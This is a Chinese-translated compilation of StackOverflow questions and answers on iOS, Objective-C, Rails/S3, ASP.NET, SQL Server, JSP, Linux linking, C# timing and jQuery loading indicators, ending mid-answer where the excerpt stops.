# StackOverflow 问答 10811000-10811999

# iphone - 链接器命令失败，Xcode 项目中出现退出代码 1 错误

> ID：10811001
> 
> 赞同：14
> 
> 时间：2012-05-30T06:27:24.747
> 
> 标签：iphone, objective-c, ios, xcode

我正在处理我的项目，在编辑代码和编译后突然出现了这个错误：

> ld：警告：找不到选项“
> -L/Users/mani/Documents/Classes/Twitter+OAuth/Libraries & Headers”的目录 ld：/Users/mani/Library/Developer/Xcode/DerivedData/ 中的重复符号 _OBJC_CLASS_$_playSiew learn-aktrtiwswclovoatyweyquoxmypa/Build/Intermediates/learn.build/Debug-iphonesimulator/learn.build/Objects-normal/i386/playSiew.o 和 /Users/mani/Library/Developer/Xcode/DerivedData/learn-aktrtiwswclovoatyweyquoxmypa/Build/Intermediates /learn.build/Debug-iphonesimulator/learn.build/Objects-normal/i386/Thumb.o 架构 i386 clang：错误：链接器命令失败，退出代码为 1（使用 -v 查看调用）

我从未接触过项目设置，只是编辑了代码。

更奇怪的是，我从 svn 中取出了最后修改的代码，但我仍然得到了同样的错误。

* * *

## 回答 #1

> 赞同：27
> 
> 时间：2012-05-30T06:49:18.170

您可能不小心`#import`使用了 .m 文件而不是 .h。使用 Cmd+Shift+F 并搜索“.m”（不带引号）。它很可能属于警告中提到的类别之一。如果没有，请清理并再次运行。

* * *

## 回答 #2

> 赞同：22
> 
> 时间：2015-07-01T08:59:52.083

我也有同样的问题，我做了以下，问题就消失了。

转到**产品**->**清理**并重新运行项目。

我希望它可能对其他一些开发人员有用。

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2013-01-02T14:24:56.097

几分钟前遇到这个问题后（是的，我知道距离原来的线程已经 7 个月了）我发现我的问题的根源是由于我在 XCode 中将文件拖放到我的项目中而不是右键单击和选择将文件添加到项目。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2012-05-30T06:55:10.713

检查 playSiew.m 在编译源部分。不是吗？

您可以按照此步骤找到编译源部分

1.  选择您的项目名称
2.  选择目标
3.  选择构建阶段

如果本节中没有 playSiew.m 。您必须将其添加到此部分。

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2012-05-30T09:30:16.797

正如我所说，问题不在于代码，而在于一些设置。所以我所做的是从我朋友的 Mac 上复制代码（它工作正常），并将该项目的新副本安装到我的 Mac 上。有效。

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2017-05-04T22:46:41.967

我在一个测试用例中导入了一个**库，我在我的****pod 文件**中为主要目标指定了一个库，但没有为**测试目标**指定。

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2015-10-06T18:50:03.090

我也收到了这个错误，因为我不小心包含了同一个源文件的两个版本。删错了，问题就解决了……

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2017-04-11T13:23:14.587

如果您在 Unity 中工作并导出到 iOS 并且正在使用插件，请转到 Xcode Build Settings 并设置 ENABLE BITCODE = NO。我猜这也可能适用于其他情况

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2015-04-04T09:43:43.757

遇到类似问题，在模拟器上运行代码时，尝试了上述所有选项，仍然得到相同的错误。尝试连接 iOS 设备并构建代码，它对我们有用。这可能是一个快速的解决方法。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2014-11-13T11:17:42.267

我面临同样的错误。所以，我刚刚删除了那些产生错误的类的引用，然后再次给出了引用，错误就消失了......

正如[D80Buckeye](https://stackoverflow.com/users/1882632/d80buckeye)所说，应该存在拖放文件而不是单击“添加文件”的问题

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2015-06-10T17:43:33.407

万一这对其他人有用——我只是遇到了同样的错误，结果发现原因是在我的头文件而不是主文件中初始化了一个变量。

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2015-09-24T12:20:51.147

我刚刚遇到了同样的错误。如果您使用嵌入式库，请确保您的**部署目标**设置为 iOS 8.0 或更高版本。

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2016-01-11T14:33:03.977

您只需要添加以下框架：quartzcore.framework

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2017-01-28T00:14:38.883

我们可以在我们的项目中克服这个错误的唯一方法是进行清理，然后为 iPad Retina 构建。之后，它将为任何设备成功构建。奇怪的。

* * *

## 回答 #15

> 赞同：0
> 
> 时间：2017-05-05T12:49:42.477

在我的情况下，我添加了 FacebookLoginSDK 框架的引用，但忘记在构建设置中提供搜索路径。删除它的引用后一切都很好。

所以结论是，如果您要添加任何外部框架，请小心。

* * *

## 回答 #16

> 赞同：0
> 
> 时间：2017-06-03T23:30:58.567

如果 CoreData 生成的类发生这种情况，请将 +CoreDataProperties 和 +CoreDataClass 组合到 +CoreDataProperties 类中并删除 +CoreDataClass。确保在派生数据中搜索 +CoreDataClass 的剩余部分。即使在删除派生数据和清理之后，我有时也会让 Xcode 一次又一次地生成 +CoreDataClass。在 Finder 中手动删除它然后重新构建帮助我解决了这个问题。

* * *

## 回答 #17

> 赞同：0
> 
> 时间：2017-06-27T13:15:28.597

试试这个，去Target -> Build Settings，然后搜索这三个如下，

GCC_NO_COMMON_BLOCKS，

CLANG_WARN_INFINITE_RECURSION，

CLANG_WARN_SUSPICIOUS_MOVE，

将 NO 设置为每个值，然后清理并构建。

* * *

## 回答 #18

> 赞同：0
> 
> 时间：2017-07-20T18:33:26.910

我尝试了列出的几个答案，但没有一个对我有用。更新 XCode 后出现错误（虽然它仍处于打开状态，这可能导致了问题）

**首先**，我删除了我的 Derived Data 文件夹：XCode => Preferences => Locations => 双击指示 Derived Data 文件夹所在位置的路径旁边的箭头。然后“移至垃圾箱”我不认为这是问题所在，但令人惊讶的是，有多少次这对我处理不同的问题来说是个问题。

**其次**，我“退出”模拟器。

**第三**，我“退出”XCode。

**第四**，我再次在 XCode 中打开了我的项目，然后进行了清理和构建（在产品菜单中找到）

**第五**，我运行了我的项目，它运行良好

* * *

## 回答 #19

> 赞同：0
> 
> 时间：2017-08-10T18:37:03.543

清理项目对我不起作用。重新启动 Xcode 对我有用...

* * *

## 回答 #20

> 赞同：0
> 
> 时间：2018-04-23T11:56:35.697

对我来说是不同的。当我删除一个 Pod 并通过从**Build Settings中的****Other Linker Flags**中删除这个 pod 来解决它时，我遇到了同样的错误

 **[![在此处输入图像描述](../Images/670069b35cdabba6488a654036911196.png)](https://i.stack.imgur.com/araZ2.png)

然后清理你的项目 [Product > Clean] 并重建

* * *

## 回答 #21

> 赞同：-2
> 
> 时间：2017-07-06T12:55:16.740

转到 xcode 中的通用和链接框架和库，并删除那里的所有文件。

![在此处输入图像描述](../Images/ca1adf738c9c634d1e169ede2e426a54.png)**

# ios - facebook.dialog 使用禁用登录通知的 facebook 帐户失败

> ID：10811002
> 
> 赞同：3
> 
> 时间：2012-05-30T06:27:27.007
> 
> 标签：ios, facebook

我正在使用 Facebook iOS SDK，

当我使用禁用登录通知的 facebook 帐户调用 facebook.dialog 时，输入登录名后，它会引发以下异常。

`error description: Error Domain=NSURLErrorDomain Code=-999 "The operation couldn‚Äôt be completed. (NSURLErrorDomain error -999.)"`

`UserInfo=0xc2a1d10 {NSErrorFailingURLKey=https://m.facebook.com/?hasnext#!/dialog/stream.publish?_path=stream.publish&app_id=370118113020066&redirect_uri=fbconnect%3A%2F%2Fsuccess&sdk=2&display=touch&link=http%3A%2F%2Fprime31.com&caption&name=Prime31+Studios&picture&api_key=370118113020066&from_login=1&client_id=370118113020066&refid=9, NSErrorFailingURLStringKey=https://m.facebook.com/?hasnext#!/dialog/stream.publish?_path=stream.publish&app_id=370118113020066&redirect_uri=fbconnect%3A%2F%2Fsuccess&sdk=2&display=touch&link=http%3A%2F%2Fprime31.com&caption&name=Prime31+Studios&picture&api_key=370118113020066&from_login=1&client_id=370118113020066&refid=9}`

# objective-c - NSArray getter 方法没有返回正确的值

> ID：10811012
> 
> 赞同：1
> 
> 时间：2012-05-30T06:28:00.083
> 
> 标签：objective-c, ios, properties, nsmutablearray, nsarray

我正在制作一个程序，其中一个类（classA）生成一个随机数并将其添加到一个可变数组中。视图控制器 (viewControllerA) 从 classA 调用方法并接收随机数数组并将其存储在自己的数组中。

我有另一个需要相同数组的类（classB）。在 viewcontrollerA 完成它需要对数组执行的操作后，它会调用 classB 中数组的 setter 方法。我在 classB 中的数组的 setter 和 getter 方法中调用 NSLog 来检查它是否加载。

```
-(void)setRandomNumberArray:(NSArray *)randomNumberArray{
_randomNumberArray = randomNumberArray;

NSLog(@"%@ setter", _randomNumberArray);
} 
```

-

```
-(NSArray *)randomNumberArray{
if (!_randomNumberArray) {
    _randomNumberArray = [[NSArray alloc] init];
}

NSLog(@"%@ getter", _randomNumberArray);
return _randomNumberArray;
} 
```

当我在 viewControlerA 中调用 setter 方法时，NSLog 返回数组的值。当我在 viewControllerB 中调用 getter 方法时，NSLog 不会从 getter 方法中打印任何内容。

```
2012-05-29 23:57:43.589 SwipeGame[8603:f803] (
) getter 
```

它显然是在设置数组，但在我想得到它时没有保留它。到底是怎么回事？我尝试了多种其他技术，它总是设置数组，但在我想“获取”数组时不保留它。

我的数组的属性设置为保留 btw ..

更新：是的，我正在使用 ARC。我的财产声明是：

```
@property (nonatomic, strong) NSArray *randomNumberArray 
```

已解决：感谢您的所有帮助！这是实例的问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-30T07:20:09.490

你用ARC吗？

ARC版本如下：

```
@interface Foo : NSObject {
  NSMutableArray *_randomNumberArray;
}
@property (nonatomic, strong) NSMutableArray *randomNumberArray;
@end

@implementation Foo
@synthesize randomNumberArray = _randomNumberArray;
- (void)setRandomNumberArray:(NSMutableArray *)randomNumberArray {
    _randomNumberArray = randomNumberArray;
    NSLog(@"%@ setter", _randomNumberArray);
}

- (NSMutableArray *) randomNumberArray {
  if ( _randomNumberArray == nil )
    _randomNumberArray = [[NSMutableArray alloc] init];

  NSLog(@"%@ getter", _randomNumberArray);
  return _randomNumberArray;
}
@end 
```

非 ARC 版本如下：

```
@interface Foo : NSObject {
  NSMutableArray *_randomNumberArray;
}
@property (nonatomic, strong) NSMutableArray *randomNumberArray;
@end

@implementation Foo
@synthesize randomNumberArray = _randomNumberArray;
- (void)setRandomNumberArray:(NSMutableArray *)randomNumberArray {
    [_randomNumber release];
    _randomNumberArray = randomNumberArray;
    [_randomNumberArray retain];
    NSLog(@"%@ setter", _randomNumberArray);
}

- (NSMutableArray *) randomNumberArray {
  if ( _randomNumberArray == nil )
    _randomNumberArray = [[NSMutableArray alloc] init];

  NSLog(@"%@ getter", _randomNumberArray);
  return _randomNumberArray;
}

- (void)dealloc {
   [_randomNumberArray release];
}

@end 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-30T06:39:52.393

您的 setter 方法没有提到 viewControllerB。您只是在设置一个内部变量。viewControllerB 如何知道已设置的数组？

最简单的方法是使用`@properties`and `@synthesize`：

```
// in A
viewControllerB.array = _array; 
```

至于保留问题：如果您使用 ARC，则不必担心。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-30T10:11:51.433

如果您使用 来创建此随机数数组`NSMutableArray`，并将其传递给设置器，则该数组可能会在稍后被调用者更改（例如，删除所有项目），并且该数组可以在您的脚下发生变化。

对于像`NSArray`和`NSString`具有可变子类型的类型，您应该将您的属性声明为`copy`而不是`strong`. 这将确保传递给您的数组在以后不会被其他人更改。复制性能不是问题，因为常规的不可变类型非常有效地处理副本。

# ruby-on-rails - 如何在 S3 中存储数据并允许用户使用 rails API / iOS 客户端以安全的方式访问？

> ID：10811017
> 
> 赞同：94
> 
> 时间：2012-05-30T06:28:17.573
> 
> 标签：ruby-on-rails, api, amazon-s3, amazon-ec2, client-server

我是编写 Rails 和 API 的新手。我需要一些有关 S3 存储解决方案的帮助。这是我的问题。

我正在为用户在 iOS 上使用 Facebook API 登录的 iOS 应用程序编写 API。服务器根据 Facebook 向 iOS 用户发出的令牌验证用户，并发出临时会话令牌。从这一点开始，用户需要下载存储在 S3 中的内容。此内容仅属于用户及其朋友的子集。该用户可以向 S3 添加更多内容，这些内容可以被同一群人访问。我想这类似于将文件附加到 Facebook 群组......

用户可以通过 2 种方式与 S3 交互...将其留给服务器或让服务器发出临时 S3 令牌（不确定此处的可能性），用户可以直接访问 S3 的内容 URL。我发现这个问题在谈论这些方法，但是，它确实过时了（2 年前）：[关于从 iPhone 应用程序和 S3 上传照片的建筑和设计问题](https://stackoverflow.com/questions/4481311/architectural-and-design-question-about-uploading-photos-from-iphone-app-and-s3)

所以问题：

*   颁发临时令牌时，是否有办法限制用户仅访问 S3 上的某些内容？我怎样才能做到这一点？假设有……说 100,000 或更多用户。
*   让iOS设备直接拉出这些内容是个好主意吗？
*   还是应该让服务器控制所有内容传递（这当然解决了安全问题）？这是否意味着我必须先将所有内容下载到服务器，然后再将其交给连接的用户？
*   如果您知道 rails... 我可以使用回形针和 aws-sdk gem 来实现这种设置吗？

对多个问题表示歉意，我感谢您对问题的任何见解。谢谢 ：）

* * *

## 回答 #1

> 赞同：113
> 
> 时间：2012-06-05T17:31:29.877

使用[aws-sdk gem](https://github.com/aws/aws-sdk-ruby)，您可以通过调用以下方法获取任何 S3 对象的临时签名 url [`url_for`](https://docs.aws.amazon.com/AWSRubySDK/latest/AWS/S3/S3Object.html#url_for-instance_method)：

```
s3 = AWS::S3.new(
  :access_key_id => 1234,
  :secret_access_key => abcd
)
object = s3.buckets['bucket'].objects['path/to/object']
object.url_for(:get, { :expires => 20.minutes.from_now, :secure => true }).to_s 
```

这将为您提供一个仅用于 S3 中该对象的已签名临时使用 URL。它会在 20 分钟后过期（在这个例子中），它只对那个对象有用。

如果您有很多客户需要的对象，您将需要发布大量签名 URL。

> 还是应该让服务器控制所有内容传递（这当然解决了安全问题）？这是否意味着我必须先将所有内容下载到服务器，然后再将其交给连接的用户？

请注意，这并不意味着服务器需要下载每个对象，它只需要验证并授权特定客户端访问 S3 中的特定对象。

来自亚马逊的 API 文档： [https ://docs.aws.amazon.com/AmazonS3/latest/dev/RESTAuthentication.html#RESTAuthenticationQueryStringAuth](https://docs.aws.amazon.com/AmazonS3/latest/dev/RESTAuthentication.html#RESTAuthenticationQueryStringAuth)

* * *

## 回答 #2

> 赞同：47
> 
> 时间：2015-07-10T18:58:23.960

以上答案使用旧的 aws-sdk-v1 gem 而不是新的 aws-sdk-resources 版本 2。

新方法是：

```
aws_resource = Aws::S3::Resource::new
aws_resource.bucket('your_bucket').object('your_object_key').presigned_url(:get, expires_in: 1*20.minutes) 
```

其中 your_object_key 是文件的路径。如果你需要查看它，你会使用类似的东西：

```
s3 = Aws::S3::Client::new
keys = []
s3.list_objects(bucket: 'your_bucket', prefix: 'your_path').contents.each { |e| 
  keys << e.key
} 
```

这些信息非常难以挖掘，我几乎放弃并使用了较旧的宝石。

### 参考

[http://docs.aws.amazon.com/sdkforruby/api/Aws/S3/Object.html#presigned_url-instance_method](http://docs.aws.amazon.com/sdkforruby/api/Aws/S3/Object.html#presigned_url-instance_method)

# ios - 使用 performSelectorInBackground 时内存泄漏

> ID：10811019
> 
> 赞同：2
> 
> 时间：2012-05-30T06:28:40.023
> 
> 标签：ios, memory-leaks, background-process, performselector

我是 iOS 开发的新手。我在运行后台线程时遇到问题。在我的代码中，resetUi 在主 UI 线程上运行，现在我正在启动一个后台线程来获取图像数据并更新我的图像。一切正常，但调用 performSelectorInBackground 时内存泄漏。

请让我知道我在哪里做错了。另外请建议在从 URL（dataWithContentsOfURL）获取时是否有更好的方法来更新我的图像。

[更新]

仪器显示 2 个单独的泄漏，一个在 perfromSelectorInBackground，另一个在 UIImage imageWithData。我猜 imageupdate(imageWithData) 出了点问题

```
-(void)updateData{
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];     

    profileName.text = oAuthTwitter.screen_name;

    if(profilePic.image == nil){
        NSString *urlString = @"https://api.twitter.com/1/users/profile_image/";
        urlString = [urlString stringByAppendingFormat:oAuthTwitter.screen_name];   
        urlString = [urlString stringByAppendingFormat:@"?size=bigger"];            
        profilePic.image = [UIImage imageWithData:[NSData dataWithContentsOfURL:[NSURL URLWithString:urlString]]];          
        [activityIndicator stopAnimating];
        [activityIndicator release];
    }   
    [pool drain];   

}   

- (void)resetUi{

    if (oAuthTwitter.oauth_token_authorized) {
        profilePic.hidden = NO;
        profileName.hidden = NO;

        NSLog(@"Resetting to authorised state");
        [self performSelectorInBackground:@selector(updateData) withObject:nil];

    }else{

        NSLog(@"Resetting Twitter UI to non-authorized state.");

    profilePic.hidden = YES;
        profileName.hidden = YES;       

    }

} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-30T06:31:09.070

我认为你应该使用

```
[pool release]; 
```

而不是

```
[pool drain]; 
```

这是更好的做法。

你也可以尝试在主线程中释放activityIndi​​cator吗？

From the code you have given I can't find any other cause for leak.. Have you tried to run your code using leak instrument and static analyzer?

# c# - Gridview ItemTemplate 的条件逻辑（仅使用标记）

> ID：10811023
> 
> 赞同：1
> 
> 时间：2012-05-30T06:28:58.073
> 
> 标签：c#, asp.net, .net, vb.net, gridview

我有一个网格视图，如下所示。当 EmpType 为合同时，EmpID 必须掩码为“XXX”；对于正式员工，应显示实际的 EmpID。另外，当它被屏蔽时，我需要在 EmpID 列中添加一个**按钮控件。**

我需要使用**标记**来做到这一点；不使用后面的代码。我们如何为这个逻辑编写 Gridview 的 ItemTemplate 的条件逻辑？

注意：.Net 4.0

```
 <asp:GridView ID="Gridview1" runat="server" AutoGenerateColumns="False">
        <Columns>
            <asp:BoundField HeaderText="AssociateID" DataField="AssociateID" />
            <asp:TemplateField HeaderText="EmpID">
                <ItemTemplate>
                    <%# Eval("EmpID")%>
                </ItemTemplate>
            </asp:TemplateField>
            <asp:BoundField HeaderText="EmpType" DataField="EmpType" />
        </Columns>
    </asp:GridView> 
```

代码背后

```
 List<Associate> associatesList = new List<Associate>();
    associatesList.Add(new Associate { AssociateID = 1, EmpID = 101, EmpType = "Contract" });
    associatesList.Add(new Associate { AssociateID = 2, EmpID = 102, EmpType = "Regular" });
    Gridview1.DataSource = associatesList;
    Gridview1.DataBind(); 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-05-30T06:37:19.580

试试这个

```
<%# Eval("EmpType") == "Contract" ? "XXX" : Convert.ToString(Eval("EmpID"))%> 
```

代替

```
 <%# Eval("EmpID")%> 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-30T09:32:50.340

以下作品

```
 <asp:TemplateField HeaderText="EmpID">
                <ItemTemplate>
                    <%# Convert.ToString(Eval("EmpType")) == "Contract" ? "XXX" : Convert.ToString(Eval("EmpID"))%>

                    <asp:Button ID="Button1" runat="server" Text="Button" 
                    Visible='<%# Eval("EmpType") == "Contract" ? true : false %>' />

                </ItemTemplate>
            </asp:TemplateField> 
```

**有关的：**

行号可以通过下面的[Get GridView Selected Row Values using Page Previous Page获得](https://stackoverflow.com/questions/10831647/get-gridview-selected-row-values-using-page-previous-page)

```
CommandArgument="<%# ((GridViewRow)Container).RowIndex %>" 
```

# sql-server-2008 - 如何为表 A 中的每条记录删除表 B 中的第一个匹配记录？

> ID：10811031
> 
> 赞同：0
> 
> 时间：2012-05-30T06:29:58.977
> 
> 标签：sql-server-2008, sql-server-2005

表A包含应该从表B中删除的多条记录。但是，表B中可以有多个记录匹配表A中的单个记录。我只想删除表B中第一个匹配的记录为表A中的每条记录. 如果表 A 中有 50 条记录，则应从表 B 中删除最多 50 条记录。我正在使用下面的 SQL 语句，由于多个匹配项，从表 B 中删除的记录多于表 A 中列出的记录。由于数据的限制，我无法在我的陈述中进一步限制匹配标准。

```
DELETE FROM [#DraftInvoiceRecords] FROM [#DraftInvoiceRecords]
INNER JOIN [#ReversedRecords]
ON [#DraftInvoiceRecords].employee = [#ReversedRecords].employee 
  and [#DraftInvoiceRecords].amount = [#ReversedRecords].amount
  and [#DraftInvoiceRecords].units = [#ReversedRecords].units 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-30T06:48:19.837

您需要一些方法来区分要删除的行和要保留的行。我`someOtherColumn`在下面使用来实现这一点：

```
create table #DraftInvoiceRecords (
    employee int not null,
    amount int not null,
    units int not null,
    someOtherColumn int not null
)
create table #ReversedRecords (
    employee int not null,
    amount int not null,
    units int not null
)
insert into #DraftInvoiceRecords (employee,amount,units,someOtherColumn)
select 1,1,1,1 union all
select 1,1,1,2
insert into #ReversedRecords (employee,amount,units)
select 1,1,1
delete from dir
from
    #DraftInvoiceRecords dir
        inner join
    #ReversedRecords rr
        on
            dir.employee = rr.employee and
            dir.amount = rr.amount and
            dir.units = rr.units
        left join
    #DraftInvoiceRecords dir_anti
        on
            dir.employee = dir_anti.employee and
            dir.amount = dir_anti.amount and
            dir.units = dir_anti.units and
            dir.someOtherColumn > dir_anti.someOtherColumn --It's this condition here that allows us to distinguish the rows
where
    dir_anti.employee is null

select * from #DraftInvoiceRecords

drop table #DraftInvoiceRecords
drop table #ReversedRecords 
```

# jsp - 使用jsp浏览文件和文件夹

> ID：10811035
> 
> 赞同：1
> 
> 时间：2012-05-30T06:30:12.407
> 
> 标签：jsp, listview, directory, file-handling

我想以链接格式显示目录及其文件，也就是说，如果我单击该目录，它应该显示该目录中的文件。我试图将目录作为链接获取，但不知道如何获取文件

我获取目录作为链接的代码。

```
<%
try{
File dirName = new File("/home/adapco/Desktop/Startest/");

if (dirName.exists()&& dirName.isDirectory())
{
//out.print("path: " + dirName.getAbsolutePath() + "<br>");
String[] allFiles = dirName.list();
for (int i=0; i < allFiles.length; i++)
{
out.println(allFiles[i] + "<br>");
%>
<a href="Startest/<%=allFiles[i]%>"><%=allFiles[i]%></a>
}
}
}
catch (IOException ex){
out.println("Exception Occured");
}
%> 
```

我试图以相同的方式获取文件，但它不起作用

```
File folder = new File("/home/adapco/Desktop/Startest/");
File[] listOfFiles = folder.listFiles(); 
```

我想知道如何获取目录和文件并将它们链接起来以便浏览。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-30T06:55:52.143

folder.listFiles() 的结果是文件和目录的数组。这一切都在那里。您可以使用 file.isDirectory() 或 file.isFile() 来检测它是目录还是文件。

您将拥有映射到“/filesystem/*”的 servlet/controller，您可以提取 filesystem/folder1/folder2 -> folder1/folder2 之后的路径。将您的文件系统添加到此路径，创建文件并返回文件夹的内容。所以到 folder2 的链接将是：

```
<a href="<c:url value='/filesystem/folder1/folder2'/>">folder2</a> 
```

要在 url 符号中不支持编码，请使用 URLEncoder() 作为文件夹名称。

# linux - 未定义对“XF86VidModeSwitchToMode”的引用

> ID：10811037
> 
> 赞同：2
> 
> 时间：2012-05-30T06:30:28.257
> 
> 标签：linux, physx

当我在 ubuntu 12.04 中编译 physx 的演示时，总是会出现一些错误，就像

```
./../../SampleFramework/platform/lib/linux64/libSamplePlatform-MTCHECKED.a(LinuxSamplePlatform.cpp.o): In function `SampleFramework::LinuxPlatform::closeWindow()':
/home/squall/physx/Samples/compiler/linux64public/./../../SampleFramework/platform/src/linux/LinuxSamplePlatform.cpp:369: undefined reference to `XF86VidModeSwitchToMode'
/home/squall/physx/Samples/compiler/linux64public/./../../SampleFramework/platform/src/linux/LinuxSamplePlatform.cpp:370: undefined reference to `XF86VidModeSetViewPort'
./../../SampleFramework/platform/lib/linux64/libSamplePlatform-MTCHECKED.a(LinuxSamplePlatform.cpp.o): In function `SampleFramework::LinuxPlatform::openWindow(unsigned int&, unsigned int&, char const*, bool)':
/home/squall/physx/Samples/compiler/linux64public/./../../SampleFramework/platform/src/linux/LinuxSamplePlatform.cpp:271: undefined reference to `XF86VidModeQueryVersion'
/home/squall/physx/Samples/compiler/linux64public/./../../SampleFramework/platform/src/linux/LinuxSamplePlatform.cpp:299: undefined reference to `XF86VidModeGetAllModeLines'
/home/squall/physx/Samples/compiler/linux64public/./../../SampleFramework/platform/src/linux/LinuxSamplePlatform.cpp:310: undefined reference to `XF86VidModeSwitchToMode'
/home/squall/physx/Samples/compiler/linux64public/./../../SampleFramework/platform/src/linux/LinuxSamplePlatform.cpp:311: undefined reference to `XF86VidModeSetViewPort' 
```

我添加的头文件包括编译器提到的函数，但错误仍然出现。我很累。有谁能够帮我？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-02T14:12:40.733

只需将 -lXxf86vm -lXext -lX11 标志添加到链接器设置中。并且不要忘记在 aptitude 中安装 libxxf86vm-dev 软件包。

# c# - 使用 Timer 对 C# 代码进行计时

> ID：10811039
> 
> 赞同：1
> 
> 时间：2012-05-30T06:30:44.920
> 
> 标签：c#, algorithm, time, code-analysis

尽管在算法分析和 Big-Oh! 方面检查代码的性能很好！我想看看代码在我的电脑上执行需要多少时间。我已将 List 初始化为 9999count 并从其中删除了偶数元素。可悲的是，执行此操作的时间跨度似乎是`0:0:0`. 对结果感到惊讶，我的执行时间一定有问题。**有人可以帮我计时代码正确吗？**

```
 IList<int> source = new List<int>(100);
        for (int i = 0; i < 9999; i++)
        {
            source.Add(i);
        }

        TimeSpan startTime, duration;
        startTime = Process.GetCurrentProcess().Threads[0].UserProcessorTime;

        RemoveEven(ref source);
        duration = Process.GetCurrentProcess().Threads[0].UserProcessorTime.Subtract(startTime);

        Console.WriteLine(duration.Milliseconds);
        Console.Read(); 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-05-30T06:33:43.377

最适合使用的东西是`Stopwatch`- 任何涉及的东西`TimeSpan`都*远远*不够精确：

```
var watch = Stopwatch.StartNew();
// something to time
watch.Stop();
Console.WriteLine(watch.ElapsedMilliseconds); 
```

但是，现代 CPU 非常快，如果它*能够*在那个时候移除它们，我也不会感到惊讶。通常，对于计时，您需要多次重复操作才能获得合理的测量结果。

另外：几乎可以肯定不需要`ref`in 。`RemoveEven(ref source)`

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-05-30T06:35:05.507

在 .Net 2.0 中，您可以使用[Stopwatch](http://msdn.microsoft.com/en-us/library/system.diagnostics.stopwatch.aspx)类

```
IList<int> source = new List<int>(100);
for (int i = 0; i < 9999; i++)
{
    source.Add(i);
}

Stopwatch watch = new Stopwatch();

watch.Start();
RemoveEven(ref source);
//watch.ElapsedMilliseconds contains the execution time in ms
watch.Stop() 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-30T12:04:22.263

添加到以前的答案：

```
var sw = Stopwatch.StartNew();

// instructions to time

sw.Stop(); 
```

`sw.ElapsedMilliseconds`返回一个 long 并具有以下分辨率：

**1 毫秒 = 1000000 纳秒**

`sw.Elapsed.TotalMilliseconds`返回一个双精度值，其分辨率等于[Stopwatch.Frequency](http://msdn.microsoft.com/en-us/library/system.diagnostics.stopwatch.frequency.aspx)的倒数。例如，在我的 PC 上，每秒`Stopwatch.Frequency`的刻度值为：`2939541``sw.Elapsed.TotalMilliseconds`

**1/2939541 秒 = 3,401891655874165e-7 秒 = 340 纳秒**

# php - 如何使用js在load（）过程中显示加载图像

> ID：10811040
> 
> 赞同：0
> 
> 时间：2012-05-30T06:30:57.227
> 
> 标签：php, javascript, jquery, web

我想在我的页面中显示加载图像。我有一个`load()`功能，我需要在加载时在页面中心显示加载图像，并且我正在将 load() 与骨干路由器一起使用。

我想我需要 javascript 来做到这一点，但我不知道如何仅在 load() 过程中显示它。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-30T06:47:34.897

假设您有一个带有图像标签的 div。如果您有 ajax 请求，则可以像这样显示或隐藏 div...（将此代码放在 .ready 函数上）

```
$('#loadingDiv')
    .hide()  // hide it initially
    .ajaxStart(function() {
        $(this).show();
    })
    .ajaxStop(function() {
        $(this).hide();
    }); 
```

如果你没有 ajax 调用而不是像这样使用......

```
function Load()
{
    $('#loadingDiv').hide();  // hide it initially
    $('#loadingDiv').show() ; 
    //-------------Your code here of form loading------
    //-------------Your code here of form loading------
    //-------
    //-------
     $('#loadingDiv').hide();// hide it in the last
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-30T07:26:42.320

```
**You can use in this way**
 function showLoadingMsg() {
    $('#loading-message').css({
        display   : 'block'

        });
    }
function hideLoadingMsg() {
    $('#loading-message').remove();
}

**the place where you want to show loading gif**
<!--loding image goes here--> 
    <div style="display:none" id="loading-message"><img src="<?php echo base_url(); ?>assests/img/loading.gif" /></div> 

**When to show and hide should be in**

obj.fbId ="14232";
showLoadingMsg();
$.post("<?= base_url() ?>welcome/insertVideos",obj,
                                                        function(success){
    hideLoadingMsg();
}, "json"); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-30T06:39:28.130

我也是 php 开发人员，我使用 jquery 进行了此操作。您可以像这样通过 Jquery 使用它：- 只需确认您的 jquery 脚本存在。

```
<div id="popup1" class="popup_block">
    <?php echo $this->Html->image('loader2.gif'); ?>
    <h4>Processing Please Wait...! </h4>
</div> 
```

你必须调用这个函数

```
 function open_loader(){
            if(enrollFlag==0){
              return false;
            }
            //Fade in Background
            jQuery('body').append('<div id="fade"></div>'); //Add the fade layer to bottom of the body tag.
            jQuery('#fade').css({'filter' : 'alpha(opacity=80)'}).fadeIn(); //Fade in the fade layer
            var popID = 'popup1';
            //var popWidth = 500;
            //Fade in the Popup and add close button
            jQuery('#' + popID).css({ 'width': '250' });

            //Define margin for center alignment (vertical + horizontal) - we add 80 to the height/width to accomodate for the padding + border width defined in the css
            var popMargTop = (jQuery('#' + popID).height() + 80) / 2;
            var popMargLeft = (jQuery('#' + popID).width() + 80) / 2;

            //Apply Margin to Popup
            jQuery('#' + popID).css({
                'margin-top' : -popMargTop,
                'margin-left' : -popMargLeft,
                'display' : 'block'
            });
    } 
```

此函数将在执行时显示加载器图像..

或者，如果您坚持`load()` 这样做：-

```
<input type="button" onclick="example_request()" value="Click Me!" />
<div id="example-placeholder">
  <p>Placeholding text</p>
</div>

